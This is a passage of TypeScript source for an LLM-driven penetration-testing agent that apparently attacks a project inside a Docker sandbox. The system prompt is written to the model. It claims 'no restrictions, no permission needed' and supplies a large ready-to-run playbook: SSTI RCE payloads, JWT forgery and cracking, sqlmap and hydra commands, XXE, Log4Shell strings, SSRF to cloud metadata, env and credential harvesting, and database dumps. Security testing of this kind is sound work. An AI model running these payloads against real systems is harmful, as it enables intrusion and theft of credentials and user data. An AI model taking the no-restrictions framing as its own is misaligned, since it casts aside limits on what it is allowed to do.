/**
 * BreachScope Sandbox Attack Agent
 *
 * Architecture: PentestGPT / HackingBuddyGPT inspired
 * - Tripartite loop: recon → hypothesis → exploit → chain
 * - Persistent attack memory with worldview compression
 * - Pentest Task Tree: structured findings, hypotheses, attack chains
 * - Full OWASP Top 10 coverage with tool-specific commands
 * - Internal service sweep (DB, Redis, Mongo, Elastic, etc.)
 * - JWT cracking, SSTI, deserialization, prototype pollution, SSRF
 * - Nuclei + ffuf + sqlmap + commix + jwt_tool + nikto
 */

import { agentLoop } from "../core/ai.js";
import { webSearch, crawlUrl } from "../core/crawler.js";
import { logger } from "../core/logger.js";
import type { Finding } from "../core/types.js";
import type { ChatCompletionTool } from "openai/resources/chat/completions";
import fs from "fs";
import path from "path";
import os from "os";
import type { ProjectType } from "../core/docker.js";

// ── Attack memory schema ──────────────────────────────────────────────────────

interface TriedAttack {
  attack: string;
  target: string;
  result: "success" | "partial" | "failed";
  evidence: string;
  timestamp: string;
}

interface AttackHypothesis {
  id: string;
  hypothesis: string;
  priority: "critical" | "high" | "medium" | "low";
  requires?: string;
  status: "pending" | "in_progress" | "done" | "abandoned";
}

interface ConfirmedFinding {
  id: string;
  title: string;
  severity: "critical" | "high" | "medium" | "low";
  category: string;
  description: string;
  evidence: string;
  remediation: string;
  timestamp: string;
}

interface AttackMemory {
  session_id: string;
  target_url: string;
  project_type: string;
  started_at: string;
  updated_at: string;
  worldview: string;
  env_vars: Record<string, string>;
  credentials: Record<string, string>;
  open_ports: number[];
  discovered_services: string[];
  discovered_endpoints: string[];
  tokens: string[];
  interesting_files: string[];
  installed_tools: string[];
  framework_versions: Record<string, string>;
  confirmed_findings: ConfirmedFinding[];
  tried_attacks: TriedAttack[];
  hypotheses: AttackHypothesis[];
  attack_chains: string[];
}

// ── Types ─────────────────────────────────────────────────────────────────────

export type AttackLogEntryType = "exec" | "http" | "search" | "crawl" | "finding" | "credential" | "chain" | "info";

export interface AttackLogEntry {
  step: number;
  type: AttackLogEntryType;
  tool: string;
  input: string;
  output: string;
  exitCode?: number;
  status?: number;
  timestamp: string;
}

export interface SandboxAgentResult {
  findings: Finding[];
  tokensUsed: number;
  attackLog: AttackLogEntry[];
  attackChains: string[];
  memoryPath: string;
}

type ExecFn = (cmd: string[], timeoutMs?: number) => Promise<{ stdout: string; stderr: string; exitCode: number }>;
type LogsFn = (tail?: number) => Promise<string>;

// ── Memory management ─────────────────────────────────────────────────────────

function createMemory(sessionId: string, targetUrl: string, projectType: string): AttackMemory {
  return {
    session_id: sessionId,
    target_url: targetUrl,
    project_type: projectType,
    started_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
    worldview: "Session just started. No information gathered yet.",
    env_vars: {},
    credentials: {},
    open_ports: [],
    discovered_services: [],
    discovered_endpoints: [],
    tokens: [],
    interesting_files: [],
    installed_tools: [],
    framework_versions: {},
    confirmed_findings: [],
    tried_attacks: [],
    hypotheses: [
      { id: "h-init-1", hypothesis: "Environment variables contain real secrets (DB passwords, API keys, JWT secrets, cloud credentials, private keys)", priority: "critical", status: "pending" },
      { id: "h-init-2", hypothesis: "Internal services (databases, caches, message queues, internal APIs) accessible without authentication", priority: "high", status: "pending" },
      { id: "h-init-3", hypothesis: "Application endpoints vulnerable to injection (SQL, command, SSTI, XXE) or auth bypass", priority: "high", status: "pending" },
      { id: "h-init-4", hypothesis: "JWT tokens use weak secret or algorithm confusion vulnerability", priority: "high", status: "pending" },
      { id: "h-init-5", hypothesis: "Source code in /app contains hardcoded credentials, insecure deserialization, or prototype pollution", priority: "high", status: "pending" },
    ],
    attack_chains: [],
  };
}

function saveMemory(memPath: string, memory: AttackMemory): void {
  memory.updated_at = new Date().toISOString();
  fs.writeFileSync(memPath, JSON.stringify(memory, null, 2), "utf-8");
}

function loadMemory(memPath: string): AttackMemory {
  return JSON.parse(fs.readFileSync(memPath, "utf-8")) as AttackMemory;
}

// ── Language-specific attack hints ───────────────────────────────────────────

function languageHints(projectType: ProjectType): string {
  const hints: Record<string, string> = {
    node: `Node.js/Express detected.
INSTALL FIRST: apt-get install -y nodejs npm curl wget netcat-openbsd postgresql-client redis-tools jq -q 2>/dev/null
FRAMEWORK-SPECIFIC ATTACKS:
- Prototype pollution: POST body {"__proto__":{"admin":true}} or {"constructor":{"prototype":{"admin":true}}}
  Test: send malicious JSON → then GET /admin or check if role changed
- JWT: look for JWT_SECRET in env. Use exec_cmd(["sh","-c","python3 -c \"import jwt; print(jwt.encode({'role':'admin','id':1},'FOUND_SECRET',algorithm='HS256'))\""])
- Express session: check cookie 'connect.sid', try forge with express-session secret
- GraphQL: try /graphql, /graphiql — introspection query: {"query":"{__schema{types{name}}}"}
- SSRF: look for URL parameters, fetch() calls in source — test http://169.254.169.254/latest/meta-data
- npm installed packages: exec_cmd(["sh","-c","cat /app/package.json | grep -E 'dependencies|version' | head -40"])
  Then web_search("PACKAGE_NAME VERSION CVE exploit") for each critical dependency
- Check for .env, .env.local, .env.production in /app and all subdirs
- Hardcoded secrets: grep -r "sk-\\|ghp_\\|npm_\\|AKIA\\|eyJ\\|password\\s*=" /app --include="*.js" --include="*.ts" --include="*.json" 2>/dev/null | head -40`,

    python: `Python (Flask/Django/FastAPI) detected.
INSTALL FIRST: apt-get install -y python3 python3-pip curl wget netcat-openbsd postgresql-client -q 2>/dev/null && pip3 install requests pyjwt 2>/dev/null
FRAMEWORK-SPECIFIC ATTACKS:
- SSTI (Jinja2/Mako): test every user-input reflection point
  Payloads: {{7*7}} → {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  {{"".__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
  crawl_url("https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection")
- Flask debug mode: check for /console endpoint (Werkzeug debugger — RCE if PIN not set)
  Detect: curl -s http://target/nonexistent | grep -i "werkzeug\|debugger\|traceback"
- Django admin: GET /admin/ — try admin:admin, admin:password
  Check settings.py for SECRET_KEY and ALLOWED_HOSTS=*
- FastAPI: GET /docs and /openapi.json — full endpoint map with schemas
- Pickle deserialization: look for pickle.loads in routes, send crafted payload
- Hardcoded: grep -r "SECRET_KEY\\|DATABASES\\|PASSWORD\\|API_KEY" /app --include="*.py" 2>/dev/null | head -30`,

    go: `Go (Gin/Echo/Fiber) detected.
INSTALL FIRST: apt-get install -y curl wget netcat-openbsd postgresql-client -q 2>/dev/null
FRAMEWORK-SPECIFIC ATTACKS:
- SSRF: Go's net/http follows redirects by default. Test: ?url=http://169.254.169.254/latest/meta-data
  Look for url, endpoint, webhook, callback, proxy parameters
- Path traversal: test /../../../etc/passwd on file-serving routes
- Goroutine panic dumps: send malformed JSON/requests, check if stack trace leaks function names/paths
- Gin debug mode: check response for "X-Middleware-Timeout" or "/debug/pprof" — exposes heap, goroutines
- CORS misconfiguration: curl -H "Origin: evil.com" -I http://target/ — check Access-Control-Allow-Origin
- Hardcoded: grep -r "password\\|secret\\|apiKey\\|token" /app --include="*.go" 2>/dev/null | head -30
- Env: look for .env, config.yaml, config.json in /app — Go apps often store secrets in config files`,

    java: `Java/Spring Boot detected.
INSTALL FIRST: apt-get install -y curl wget netcat-openbsd -q 2>/dev/null
FRAMEWORK-SPECIFIC ATTACKS:
- Spring Actuator (highest priority): GET /actuator → /actuator/env → /actuator/heapdump → /actuator/mappings → /actuator/loggers → /actuator/threaddump
  /actuator/env leaks ALL config properties including DB creds, JWT secrets, API keys
  /actuator/heapdump: download heap dump, run strings on it to extract credentials
  exec_cmd(["sh","-c","curl -s http://127.0.0.1:PORT/actuator/env | python3 -m json.tool | grep -A2 -i 'password\\|secret\\|key\\|token'"])
- Log4Shell: send \${jndi:ldap://127.0.0.1/a} in User-Agent, X-Forwarded-For, username, email fields
  web_search("Log4Shell CVE-2021-44228 detection command line test")
- Spring EL injection: test SpEL expressions in parameters — ${7*7}, #{7*7}
- Java deserialization: POST with Content-Type: application/x-java-serialized-object to any endpoint
- Swagger: GET /swagger-ui.html → /v3/api-docs → full endpoint map
- Hardcoded: grep -r "password\\|secret\\|datasource" /app --include="*.properties" --include="*.yml" --include="*.yaml" --include="*.xml" 2>/dev/null | head -30`,

    ruby: `Ruby on Rails detected.
INSTALL FIRST: apt-get install -y ruby curl wget postgresql-client -q 2>/dev/null
FRAMEWORK-SPECIFIC ATTACKS:
- Rails secrets: cat /app/config/secrets.yml, /app/config/credentials.yml.enc, /app/config/master.key, /app/config/application.yml
  RAILS_MASTER_KEY in env → decrypt credentials.yml.enc
- Development endpoints: GET /rails/info/properties, /rails/info/routes, /rails/mailers (dev only, often left on)
- Mass assignment: POST to REST endpoints with extra params like role=admin, is_admin=true, admin=1
- YAML deserialization: look for YAML.load (not safe_load) — try gadget chains
  web_search("Ruby YAML deserialization RCE gadget chain 2024")
- ActiveRecord SQLi: check for string interpolation in where() — where("name = '\#{params[:name]}'")
- session.secret_key_base in env → forge signed session cookies
  web_search("Rails cookie deserialization RCE secret_key_base exploit")
- Hardcoded: grep -r "password\\|secret\\|api_key\\|token" /app --include="*.rb" --include="*.yml" 2>/dev/null | head -30`,

    php: `PHP detected.
INSTALL FIRST: apt-get install -y php curl wget -q 2>/dev/null
FRAMEWORK-SPECIFIC ATTACKS:
- Local/Remote File Inclusion: /?page=../../etc/passwd, /?file=php://filter/convert.base64-encode/resource=index.php
  /?file=expect://id (if expect:// wrapper enabled)
- Type juggling: PHP loose comparison == : send 0 for password if it's hashed, "0e..." hashes
  POST login with password=0 when hash starts with 0e → admin bypass
- SSTI (Twig/Smarty): {{7*7}}, {php}echo id;{/php}
- Laravel: check APP_KEY in env → forge signed cookies, queue job deserialization RCE
  GET /.env direct access (misconfigured servers expose it), GET /telescope, GET /horizon
- WordPress (if present): /wp-admin/, /wp-json/wp/v2/users, xmlrpc.php brute force
- phpinfo(): look for expose_php: On header, try /phpinfo.php, /info.php
- Hardcoded: grep -r "password\\|secret\\|api_key\\|DB_PASS" /app --include="*.php" --include=".env" 2>/dev/null | head -30`,

    dotnet: `ASP.NET Core detected.
INSTALL FIRST: apt-get install -y curl wget -q 2>/dev/null
FRAMEWORK-SPECIFIC ATTACKS:
- Swagger: GET /swagger, /swagger/index.html, /swagger/v1/swagger.json — full endpoint map
- Debug/dev endpoints: /healthz, /health, /metrics, /diagnostics
  ASPNETCORE_ENVIRONMENT=Development → detailed error pages with full stack traces
- YSOSERIAL.NET: if JSON.NET deserialization found, craft payload
  web_search("ysoserial.net ASP.NET Core JSON deserialization RCE payload")
- ViewState: legacy WebForms — if __VIEWSTATE in form, exploit if MachineKey known
- SSRF: look for HttpClient usage that accepts user-supplied URLs
- Connection strings: ConnectionStrings:DefaultConnection in env or appsettings.json
- Hardcoded: grep -r "password\\|ConnectionString\\|secret\\|ApiKey" /app --include="*.cs" --include="*.json" --include="*.xml" 2>/dev/null | head -30`,

    elixir: `Elixir/Phoenix detected.
INSTALL FIRST: apt-get install -y curl wget -q 2>/dev/null
FRAMEWORK-SPECIFIC ATTACKS:
- Phoenix dev dashboard: GET /dev/dashboard (dev-only, exposes request logs, LiveView state, metrics)
- SECRET_KEY_BASE in env → forge Phoenix session tokens
  web_search("Phoenix Framework session token forgery SECRET_KEY_BASE exploit")
- LiveView WebSocket: check for ws:// or wss:// upgrade — test CSRF on LiveView channels
- Atom exhaustion: String.to_atom with user input → process crash
- Database: look for DATABASE_URL in env, connect directly with psql/mysql
- Hardcoded: grep -r "secret\\|password\\|api_key\\|token" /app --include="*.ex" --include="*.exs" 2>/dev/null | head -30`,

    rust: `Rust detected.
INSTALL FIRST: apt-get install -y curl wget -q 2>/dev/null
FRAMEWORK-SPECIFIC ATTACKS:
- Panic paths: send malformed input (empty strings, extremely long strings, special chars) to all endpoints
  Look for "thread 'tokio-runtime-worker' panicked" in logs — reveals internal paths, source
- SSRF: Rust HTTP clients (reqwest, hyper) follow redirects — test URL params for SSRF
  Test: http://169.254.169.254, http://localhost, http://[::1]
- Debug builds (common in containers): verbose error messages, full stack traces
- Config: look for config.toml, config.yaml, .env in /app — Rust apps often use dotenv
- Hardcoded: grep -r "password\\|secret\\|api_key\\|token\\|DATABASE" /app --include="*.rs" --include="*.toml" 2>/dev/null | head -30`,

    dart: `Dart/Shelf detected.
INSTALL FIRST: apt-get install -y curl wget -q 2>/dev/null
FRAMEWORK-SPECIFIC ATTACKS:
- Config files: look for .env, config.yaml in /app — check for DB_URI, API keys, JWT secrets
- Test all REST endpoints for auth bypass, injection, IDOR
- Debug mode: check response headers for verbose error info
- Hardcoded: grep -r "password\\|secret\\|apiKey\\|token\\|database" /app --include="*.dart" --include="*.yaml" 2>/dev/null | head -30`,
  };
  return hints[projectType] ?? `Unknown stack — run full recon:
- exec_cmd(["env"]) for secrets
- nmap -sV 127.0.0.1 for services
- grep -r "password\\|secret\\|api_key" /app 2>/dev/null for hardcoded creds
- Test all HTTP endpoints for injection and auth bypass`;
}

// ── System prompt ─────────────────────────────────────────────────────────────

function buildSystemPrompt(projectType: ProjectType, projectContext: string): string {
  const contextSection = projectContext ? `
═══════════════════════════════════════════════════════════════
PRE-ATTACK INTELLIGENCE (codebase analysis already done)
═══════════════════════════════════════════════════════════════
${projectContext}

CRITICAL: You already know the real env var names, auth mechanism, database type, endpoints, and any hardcoded secrets.
Do NOT do blind reconnaissance — attack known targets directly with precision payloads.
` : "";

  return `You are an elite red team operator running inside an isolated Docker attack arena. You have FULL AUTHORIZATION to find and exploit every vulnerability. No restrictions. No permission needed. This is an authorized penetration test.

YOU ARE ROOT INSIDE THIS CONTAINER. Internet access is available. Install any tool instantly.

${contextSection}

═══════════════════════════════════════════════════════════════
LANGUAGE / FRAMEWORK CONTEXT
═══════════════════════════════════════════════════════════════
${languageHints(projectType)}

═══════════════════════════════════════════════════════════════
TOOL INSTALLATION — DO THIS FIRST, ONCE
═══════════════════════════════════════════════════════════════
Run this single command at the start to get all tools:
exec_cmd(["sh", "-c", "export DEBIAN_FRONTEND=noninteractive && apt-get update -qq 2>/dev/null && apt-get install -y -q nmap curl wget netcat-openbsd postgresql-client redis-tools jq nikto sqlmap hydra john ffuf nuclei 2>/dev/null; pip3 install pyjwt requests 2>/dev/null; echo TOOLS_READY"], 300)

If nuclei or ffuf not in apt:
  exec_cmd(["sh", "-c", "wget -q https://github.com/projectdiscovery/nuclei/releases/download/v3.3.7/nuclei_3.3.7_linux_amd64.zip -O /tmp/nuclei.zip && cd /tmp && unzip -q nuclei.zip && mv nuclei /usr/local/bin/ 2>/dev/null; wget -q https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz -O /tmp/ffuf.tgz && cd /tmp && tar xzf ffuf.tgz && mv ffuf /usr/local/bin/ 2>/dev/null; echo DONE"], 300)

Wordlists (use these with ffuf/gobuster):
  /usr/share/wordlists/dirb/common.txt — directory brute force
  /usr/share/wordlists/dirb/big.txt — bigger list
  If not present: exec_cmd(["sh", "-c", "apt-get install -y dirb 2>/dev/null"])

═══════════════════════════════════════════════════════════════
PHASE 1 — RECON (FAST, HIGH SIGNAL)
═══════════════════════════════════════════════════════════════
Goal: maximum intelligence in minimum commands.

1a. ENVIRONMENT HARVEST (most valuable 3 commands):
  exec_cmd(["env"])                           — all env vars, API keys, DB creds, JWT secrets
  exec_cmd(["sh", "-c", "cat /proc/1/environ | tr '\\0' '\\n'"])  — process env (may differ)
  exec_cmd(["sh", "-c", "find /app -name '.env*' -o -name 'wrangler.toml' -o -name 'config.yaml' -o -name 'appsettings.json' -o -name 'application.yml' -o -name 'secrets.yml' 2>/dev/null | grep -v node_modules | xargs cat 2>/dev/null"])

1b. NETWORK RECON:
  exec_cmd(["sh", "-c", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"])  — what's listening
  exec_cmd(["sh", "-c", "for p in 80 443 3000 3001 4000 5000 8000 8080 8443 8888 9000 9090 3306 5432 6379 27017 9200 9300 2181 4040 5601 11211 15672 5672; do nc -z -w1 127.0.0.1 $p 2>/dev/null && echo \"OPEN:$p\"; done"])

1c. APP FINGERPRINT:
  http("GET", "/")                            — tech stack from headers, cookies, body
  http("GET", "/robots.txt")                 — hidden paths
  http("GET", "/openapi.json")               — or /swagger.json, /api-docs — full endpoint map
  exec_cmd(["sh", "-c", "ps aux | grep -v grep"])  — what's actually running

═══════════════════════════════════════════════════════════════
PHASE 2 — INTERNAL SERVICE EXPLOITATION (always do this)
═══════════════════════════════════════════════════════════════
For every open port found, immediately exploit it:

REDIS (6379):
  exec_cmd(["sh","-c","redis-cli -h 127.0.0.1 PING && redis-cli -h 127.0.0.1 KEYS '*' | head -30 && redis-cli -h 127.0.0.1 INFO server"])
  If sessions stored: exec_cmd(["sh","-c","redis-cli -h 127.0.0.1 KEYS 'sess:*' | head -5 | xargs -I{} redis-cli -h 127.0.0.1 GET {}"])

POSTGRESQL (5432):
  exec_cmd(["sh","-c","PGPASSWORD='$DB_PASSWORD' psql -h 127.0.0.1 -U $DB_USER -d $DB_NAME -c '\\\\dt' 2>/dev/null | head -20"])
  exec_cmd(["sh","-c","PGPASSWORD='$DB_PASSWORD' psql -h 127.0.0.1 -U $DB_USER -d $DB_NAME -c 'SELECT table_name FROM information_schema.tables WHERE table_schema=\\'public\\';' 2>/dev/null"])
  exec_cmd(["sh","-c","PGPASSWORD='$DB_PASSWORD' psql -h 127.0.0.1 -U $DB_USER -d $DB_NAME -c 'SELECT id,email,password,role FROM users LIMIT 10;' 2>/dev/null"])

MYSQL (3306):
  exec_cmd(["sh","-c","mysql -h 127.0.0.1 -u root -p'$DB_PASSWORD' -e 'show databases;' 2>/dev/null"])
  exec_cmd(["sh","-c","mysql -h 127.0.0.1 -u $DB_USER -p'$DB_PASSWORD' -e 'SELECT user,authentication_string FROM mysql.user;' 2>/dev/null"])

MONGODB (27017):
  exec_cmd(["sh","-c","mongosh --host 127.0.0.1 --eval 'db.adminCommand({listDatabases:1})' 2>/dev/null | head -30"])
  exec_cmd(["sh","-c","mongosh --host 127.0.0.1 --eval 'db.getCollectionNames()' 2>/dev/null"])

ELASTICSEARCH (9200):
  http("GET", "http://127.0.0.1:9200/_cat/indices?v")
  http("GET", "http://127.0.0.1:9200/_all/_search?size=5")

RABBITMQ (15672 management):
  http("GET", "http://guest:guest@127.0.0.1:15672/api/overview")

═══════════════════════════════════════════════════════════════
PHASE 3 — HTTP ATTACK (OWASP TOP 10 ORDERED BY IMPACT)
═══════════════════════════════════════════════════════════════

A1 — INJECTION (SQL, Command, SSTI):
  SQLi: exec_cmd(["sh","-c","sqlmap -u 'http://127.0.0.1:PORT/path?param=1' --batch --level=3 --risk=2 --dbs 2>/dev/null | tail -30"])
  SQLi via POST: exec_cmd(["sh","-c","sqlmap -u 'http://127.0.0.1:PORT/api/login' --data='{\"user\":\"admin\",\"pass\":\"*\"}' --batch --level=3 2>/dev/null | tail -30"])
  SSTI: test {{7*7}}, ${7*7}, #{7*7}, <%=7*7%> in every text input/parameter
  CMDi: exec_cmd(["sh","-c","commix --url='http://127.0.0.1:PORT/path?param=value' --batch 2>/dev/null | tail -20"]) if commix available
  XXE: POST XML with <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> to XML-accepting endpoints

A2 — BROKEN AUTH:
  JWT: extract token from auth endpoint, then:
    exec_cmd(["sh","-c","python3 -c \"import jwt,json; h=jwt.get_unverified_header('TOKEN'); print(json.dumps(h))\""])
    Try alg:none: exec_cmd(["sh","-c","python3 -c \"import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode(); p=base64.b64encode(json.dumps({'role':'admin','id':1,'exp':9999999999}).encode()).rstrip(b'=').decode(); print(f'{h}.{p}.')\""])
    Brute secret: exec_cmd(["sh","-c","for s in secret password admin key jwt 123456 supersecret; do python3 -c \"import jwt; jwt.decode('TOKEN','$s',algorithms=['HS256']); print('CRACKED:'+str('$s'))\" 2>/dev/null && break; done"])
    If JWT_SECRET known from env: forge admin token immediately with role:admin, is_admin:true, id:1
  Default creds: try admin:admin, admin:password, root:root, test:test, admin:123456 on /login, /admin, /api/login
  Brute: exec_cmd(["sh","-c","hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid' -t 4 -F 2>/dev/null | head -20"])

A3 — SENSITIVE DATA EXPOSURE:
  exec_cmd(["sh","-c","grep -r 'sk-\\|ghp_\\|npm_\\|AKIA[0-9A-Z]{16}\\|eyJ\\|password\\s*=\\s*[^$]\\|secret\\s*=\\s*[^$]' /app 2>/dev/null | grep -v '.git\\|node_modules\\|dist\\|.lock' | head -40"])
  http("GET", "/.env"), http("GET", "/.git/config"), http("GET", "/config.json"), http("GET", "/appsettings.json")
  Check git history: exec_cmd(["sh","-c","cd /app && git log --oneline 2>/dev/null | head -10 && git log -p --all 2>/dev/null | grep -E 'password|secret|key|token' | head -30"])

A4 — XML EXTERNAL ENTITY (XXE):
  Send to any XML endpoint: <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
  Also try: <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data">]>

A5 — BROKEN ACCESS CONTROL / IDOR:
  Enumerate /api/users/1, /api/users/2, etc. — check if you can access other users' data without auth
  Test horizontal privilege: change user_id in JWT payload to 1 (admin), to other IDs
  Check for /admin, /dashboard, /staff, /internal, /api/admin endpoints without auth

A6 — SECURITY MISCONFIGURATION:
  exec_cmd(["sh","-c","nikto -h http://127.0.0.1:PORT -maxtime 120 2>/dev/null | grep -E 'OSVDB|CVE|vuln|dangerous|Default' | head -30"])
  Nuclei: exec_cmd(["sh","-c","nuclei -u http://127.0.0.1:PORT -t misconfiguration/ -t exposures/ -t cves/ -silent 2>/dev/null | head -40"])
  Spring Actuator: GET /actuator, /actuator/env, /actuator/heapdump, /actuator/mappings
  Debug pages: /debug, /console, /dev, /dev/dashboard, /rails/info/properties, /telescope, /horizon

A7 — XSS:
  Test reflected: http("GET", "/search?q=<script>alert(1)</script>")
  http("GET", "/search?q={{7*7}}") — if 49 in response → SSTI not just XSS
  DOM XSS: check source for innerHTML, document.write, eval with user input
  Stored XSS: POST comments/profiles with <img src=x onerror=alert(document.cookie)>

A8 — INSECURE DESERIALIZATION:
  Java: POST application/x-java-serialized-object to any endpoint — check logs for ClassNotFoundException
  PHP: look for unserialize() in source with user input
  Python: look for pickle.loads in source
  Ruby: look for YAML.load or Marshal.load

A9 — KNOWN VULNERABLE COMPONENTS:
  After identifying framework version: web_search("FRAMEWORK VERSION exploit CVE 2024 2025")
  exec_cmd(["sh","-c","nuclei -u http://127.0.0.1:PORT -t cves/ -silent 2>/dev/null | head -30"])
  Check packages: cat /app/package.json, /app/requirements.txt, /app/Cargo.toml — search versions

A10 — SSRF:
  Test parameters named: url, endpoint, webhook, callback, proxy, redirect, next, target, dest, fetch
  Payloads: http://169.254.169.254/latest/meta-data (AWS), http://metadata.google.internal/computeMetadata/v1/ (GCP)
  Internal: http://127.0.0.1:6379, http://127.0.0.1:27017, http://127.0.0.1:9200

═══════════════════════════════════════════════════════════════
PHASE 4 — ENDPOINT DISCOVERY & FUZZING
═══════════════════════════════════════════════════════════════
exec_cmd(["sh","-c","ffuf -u http://127.0.0.1:PORT/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,301,302,401,403,500 -c -t 50 -timeout 3 2>/dev/null | grep -v '\\[Status: 404\\]' | head -40"])
exec_cmd(["sh","-c","ffuf -u http://127.0.0.1:PORT/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,301,302,401,403,500 -c -t 50 -timeout 3 2>/dev/null | head -40"])
For every 401/403 found: test auth bypass headers: X-Forwarded-For: 127.0.0.1, X-Real-IP: 127.0.0.1, X-Original-URL: /admin

═══════════════════════════════════════════════════════════════
ATTACK CHAIN LOGIC — connect findings
═══════════════════════════════════════════════════════════════
JWT_SECRET in env → forge admin JWT → test every endpoint with it → find what admin can access
DB creds in env → connect directly → SELECT * FROM users → dump hashes → save_finding(CRITICAL)
Redis KEYS * → find session keys → read admin session → forge session cookie → admin access
/actuator/env → extract DB creds, JWT secret → use them → full compromise chain
Weak JWT → brute secret → forge admin → IDOR as admin → data dump
SSTI found → exec id command → exec cat /etc/passwd → exec cat /proc/1/environ → full RCE chain
SQLi found → --dbs → --dump → extract users table → dump all credentials → save_finding(CRITICAL)

═══════════════════════════════════════════════════════════════
WEB RESEARCH — mandatory before every new attack surface
═══════════════════════════════════════════════════════════════
When you identify a framework or version → web_search("FRAMEWORK VERSION exploit CVE 2024 2025") immediately
When you see a CVE number → crawl_url("https://nvd.nist.gov/vuln/detail/CVE-XXXX-XXXXX")
Need exact payloads → crawl_url("https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection")
Need payload list → crawl_url("https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/README.md")
JWT attacks → crawl_url("https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens")
Spring Actuator → web_search("Spring Boot Actuator heapdump extract credentials 2024")
Research BEFORE attacking. A 3-second search beats 10 blind attempts.

═══════════════════════════════════════════════════════════════
MEMORY DISCIPLINE
═══════════════════════════════════════════════════════════════
• read_memory() at start of EVERY iteration
• update_worldview() after every 3-4 tool calls — compress what you know
• save_finding() for EVERY confirmed vulnerability — no evidence, no finding
• record_attempt() for every attack tried (success OR failure) — never repeat
• add_hypothesis() when you discover a new attack path
• save_attack_chain() for every multi-step exploit you complete
• save_credential() for every secret, token, key, connection string found

═══════════════════════════════════════════════════════════════
WHAT IS AND IS NOT A FINDING
═══════════════════════════════════════════════════════════════
NOT A FINDING — "env vars are accessible" — we injected them into the container ON PURPOSE. Everyone already knows they're there.
NOT A FINDING — "credentials found in env" alone. That is not a vulnerability.
NOT A FINDING — listing what env vars exist without exploiting them.

IS A FINDING — you CONNECTED to the database using the DATABASE_URL and dumped real data
IS A FINDING — you FORGED an admin JWT and accessed a protected endpoint
IS A FINDING — you found an auth bypass, SQL injection, IDOR, RCE, SSTI in the actual source code
IS A FINDING — you accessed Redis/MongoDB without auth and read session data
IS A FINDING — you found a hardcoded secret IN THE CODE (not in env) that bypasses auth
IS A FINDING — debug endpoint exposing internal state, stack traces with real file paths
IS A FINDING — MASTER_API_KEY=master-key-123 lets you bypass all auth — prove it by calling an admin endpoint

SEVERITY:
CRITICAL — DB dumped, auth bypass proven with HTTP response, admin access achieved, RCE
HIGH — JWT forged and working, internal service accessible and queried, path traversal reading sensitive files
MEDIUM — SSRF partially working, verbose errors leaking stack traces, debug endpoint exposed
LOW — minor info disclosure, non-exploitable header issues

═══════════════════════════════════════════════════════════════
SOURCE CODE ANALYSIS — MANDATORY
═══════════════════════════════════════════════════════════════
Read the actual source code in /app. Find REAL bugs — logic flaws, missing auth checks, injection points.

exec_cmd(["sh","-c","find /app/src -name '*.ts' -o -name '*.js' 2>/dev/null | grep -v node_modules | grep -v dist | head -50"])
exec_cmd(["sh","-c","cat /app/src/main.ts 2>/dev/null || cat /app/src/index.ts 2>/dev/null"])
exec_cmd(["sh","-c","find /app/src -name '*.controller.ts' -o -name '*.service.ts' -o -name '*.guard.ts' -o -name '*.middleware.ts' 2>/dev/null | head -30"])

For each controller: read it, find unguarded routes, missing auth decorators (@Public, no @UseGuards), IDOR patterns
For each service: find raw SQL queries, eval(), unvalidated input, hardcoded tokens
For each guard/middleware: find bypass conditions, weak validation, JWT verification gaps

Bugs to hunt in NestJS/Node.js code:
- Missing @UseGuards on sensitive routes
- @Public() decorator on dangerous endpoints
- role checks done client-side or skipped
- findOne(id) without ownership check = IDOR
- String interpolation in queries = SQLi
- req.body spread into DB update = mass assignment
- eval() or Function() with user input = RCE
- path.join with user input = path traversal
- MASTER_API_KEY hardcoded in code = auth bypass
- JWT decoded but not verified (jwt.decode vs jwt.verify)
- Missing rate limiting on auth endpoints

═══════════════════════════════════════════════════════════════
OUTPUT FORMAT (at the end)
═══════════════════════════════════════════════════════════════
Output ONLY a valid JSON array at the very end:
[{"id":"sandbox-<unique>","title":"concise title","severity":"critical|high|medium|low","category":"code","description":"EVIDENCE: exact command, exact output, proven impact","remediation":"specific fix","references":[]}]`;
}

// ── Tool definitions ──────────────────────────────────────────────────────────

const TOOLS: ChatCompletionTool[] = [
  {
    type: "function",
    function: {
      name: "read_memory",
      description: "Read your current attack journal. Shows worldview, credentials, open ports, services, endpoints, confirmed findings, tried attacks, pending hypotheses. ALWAYS call at start of every iteration.",
      parameters: { type: "object", properties: {} },
    },
  },
  {
    type: "function",
    function: {
      name: "update_worldview",
      description: "Compress and update your worldview. Call after every 3-4 tool calls. Include: tech stack identified, real credentials found (list them), open ports and services, access level achieved, confirmed vulns, and exact next attack target.",
      parameters: {
        type: "object",
        properties: {
          worldview: { type: "string", description: "Compressed state: stack, creds found (list actual key names), ports open, vulns confirmed, next target." },
        },
        required: ["worldview"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "save_finding",
      description: "Record a confirmed, evidence-backed vulnerability. Only call with concrete proof — a working exploit, a real non-placeholder secret, a real bypass with response evidence.",
      parameters: {
        type: "object",
        properties: {
          title:       { type: "string" },
          severity:    { type: "string", enum: ["critical", "high", "medium", "low"] },
          description: { type: "string", description: "EVIDENCE: exact command used, exact output received, proven attacker impact" },
          evidence:    { type: "string", description: "Raw evidence — command output, HTTP response body, exact credential value" },
          remediation: { type: "string" },
        },
        required: ["title", "severity", "description", "evidence", "remediation"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "record_attempt",
      description: "Record every attack tried so you never repeat it. Call for both successes and failures.",
      parameters: {
        type: "object",
        properties: {
